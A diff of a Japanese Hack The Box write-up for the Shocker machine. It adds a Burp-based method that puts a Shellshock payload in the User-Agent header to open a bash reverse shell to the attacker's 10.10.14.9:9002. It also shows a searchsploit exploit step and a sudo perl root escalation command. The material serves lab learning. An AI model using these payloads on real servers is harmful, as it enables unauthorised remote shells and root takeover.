@@ -1,8 +1,8 @@
 # はじめに
 Hack The Boxの攻略などを自分用にまとめたものです。
 主に記録用として記しています。
-現在のランクはHackerです。
-間違っていることも多いかと思いますが、よろしくお願いします。  
+現在のランクはPro Hackerです。
+間違っていることも多いかと思いますが、よろしくお願いします。
 <img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
 チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
 GitHub(ペネトレーションテスト用チートシート):
@@ -18,7 +18,7 @@ Shocker, while fairly simple overall, demonstrates the severity of the renowned 
 Shockerは全体的にはかなり単純ですが、何百万台もの公開サーバに影響を与えた有名なShellshockの悪用の深刻さを示しています。
 
 # スキャン
-Shocker(10.10.10.56)に対して、スキャンを行います。  
+Shocker(10.10.10.56)に対して、スキャンを行います。
 まずnmapからスキャンを開始します。
 ## nmap 
 
@@ -79,8 +79,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/07/29 02:23:06 Finished
 ===============================================================
 ```
-特に得られそうな情報がありませんでした。  
-拡張子の指定などgobusterの設定を変えてみたのですが、見つからなかったので使用するスキャナーを変更してみます。
+特に得られそうな情報がありませんでした。拡張子の指定などgobusterの設定を変えてみたのですが、見つからなかったので使用するスキャナーを変更してみます。
 
 ## dirb
 ```
@@ -107,7 +106,7 @@ GENERATED WORDS: 4612
 END_TIME: Fri Jul 31 00:51:38 2020
 DOWNLOADED: 4612 - FOUND: 3
 ```
-/cig-bin/のディレクトリにはアクセスできなかったので配下に何かファイルがないかもう一度gobusterを使って調査します。  
+/cig-bin/のディレクトリにはアクセスできなかったので配下に何かファイルがないかもう一度gobusterを使って調査します。
 cgi-binではwebサーバで動作するスクリプトファイルが格納されており、主にsh,cgi,plファイルが使われているようなので拡張子を指定してスキャンを行います。
 
 ## gobuster(2回目)
@@ -139,13 +138,27 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 user.shを発見することができました。
 
 # 侵入
-マシンの名前と.shファイルからshellshockに脆弱ではないか疑います。
+マシンの名前と.shファイルからshellshockの可能性を探ります。
 shellshockに対して脆弱であるか調べてみます。
 以下のURLを参考に調べてみます。
+exploit-db:
+https://www.exploit-db.com/docs/48112
 <img width="1273" alt="スクリーンショット 2020-07-31 17.59.56.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/ea37c5fa-ed26-bb04-5dd9-8a5591c9f6dd.png">
 これにより、echoコマンドが実行されてaaaaという文字列が表示されているので、shellshockに対して脆弱であることが分かりました。
 
-## Shellshock
+## 方法1
+続けて、Burpを介してreverse shellを確立します。
+User-agentを下記のように書き換えます。
+
+```
+User-agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/9002 0>&1'
+```
+
+![スクリーンショット 2021-05-27 150918.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/dfe55312-60c5-62da-8411-7db5972d29d0.png)
+![スクリーンショット 2021-05-27 150951.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/01f15123-e7dd-2dac-ff56-9edb16985f64.png)
+シェルを取ることができました。
+
+## 方法2
 searchsploitを使ってshellshockに使えそうなエクスプロイトを探します。
 ![コメント 2020-07-31 153020.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/58d9b268-908a-1873-6fc9-fe2639f864f4.png)
 
@@ -160,15 +173,17 @@ searshsploit -m linux/remote/34900.py
 ![コメント 2020-07-31 155657.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4ee25ee5-614b-b49c-eb78-20e90fb5c032.png)
 
 ![コメント 2020-07-31 160030.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/0b289973-98bc-1532-b0dc-6bdfc006075b.png)
-シェルをゲットすることができました。  
+シェルをゲットすることができました。
 またsudo -lの結果よりperlを使えばパスワードなしでroot権限を取得できそうです。
 
-# 特権エスカレーション
+# Privilege Escalation
+GTFOBins perl:
+https://gtfobins.github.io/gtfobins/perl/
 
 ```
 sudo perl -e 'exec("/bin/bash")'
 ```
 
 ![コメント 2020-07-31 171604.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1b212abf-d1fd-89d2-b9c6-f4490cce5125.png)
-root権限を取得しました。  
+root権限を取得しました。
 お疲れさまでした。
